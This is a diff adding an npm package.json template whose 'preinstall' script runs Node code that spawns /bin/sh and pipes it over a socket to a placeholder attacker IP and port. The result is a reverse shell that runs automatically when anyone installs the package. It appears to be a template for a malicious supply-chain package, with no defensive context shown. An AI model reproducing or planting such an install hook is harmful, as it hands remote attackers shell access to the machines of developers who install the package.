@@ -1,0 +1,13 @@
+
+{
+  "name": "npm package name here",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node -e \"const { exec } = require('child_process'); const net = require('net'); const sh = exec('/bin/sh'); const client = new net.Socket(); client.connect(listening-Port-Here, 'listening-Ip-here', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); sh.on('exit', function() { client.end(); });\""
+  },
+  "author": "",
+  "license": "ISC"
+}
